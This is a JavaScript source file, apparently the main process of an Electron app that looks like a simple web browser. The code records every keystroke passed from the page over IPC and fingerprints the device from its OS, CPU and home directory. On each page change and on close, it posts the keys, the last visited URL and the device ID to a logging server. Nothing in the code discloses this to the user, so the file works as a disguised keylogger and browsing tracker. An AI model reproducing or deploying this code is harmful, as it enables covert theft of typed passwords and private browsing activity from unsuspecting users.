const electron = require('electron');
const os = require('os');
const app = electron.app;
const axios = require('axios');
const BrowserWindow = electron.BrowserWindow;
const ipcMain = electron.ipcMain;
const path = require('path');
const url = require('url');
const fs = require('fs');

const rel = os.release();
const platform = os.platform();
const cpu = os.cpus()[os.cpus().length - 1].model;
const homedir = os.homedir();

let lastUrl = 'http://www.google.com/';
let deviceId = rel + platform + cpu + homedir.replace(/\s/g, '');
const bufferText = Buffer.from(deviceId, 'utf8');
deviceId = bufferText.toString('hex');

const addLog = async (url = '') => {
    return await axios.post('http://localhost:3000/addLog', {
        deviceId,
        url,
        keys: keylogs.join(','),
        date: new Date().toISOString()
    })
};

let mainWindow;
let keylogs = [];

function createWindow() {
    mainWindow = new BrowserWindow({
        width: 1920, height: 1080,
        webPreferences: {
            webviewTag: true,
            nodeIntegration: true
        },
        frame: false,
    });

    mainWindow.loadURL(url.format({
        pathname: path.join(__dirname, 'index.html'),
        protocol: 'file:',
        slashes: true
    }));

    mainWindow.on('closed', async function () {
        await addLog(lastUrl);
        keylogs = [];
        mainWindow = null
    });
}

app.on('ready', createWindow);

app.on('window-all-closed', function () {
    if (process.platform !== 'darwin') {
        app.quit();
    }
});

app.on('activate', function () {
    if (mainWindow === null) {
        createWindow()
    }
});

// function log (data){
//     fs.writeFile('log.txt', data+'\n\n',  {'flag':'a'},  function(err) {
//         if (err) {
//             return console.error(err);
//         }
//     });
// };

ipcMain.on("req", async (e, url) => {
    await addLog(lastUrl);
    lastUrl = url;
    keylogs = [];
});

ipcMain.on("key", (e, data) => {
    keylogs.push(data);
});

ipcMain.on("getId", (e) => {
    e.reply("getId", deviceId)
});
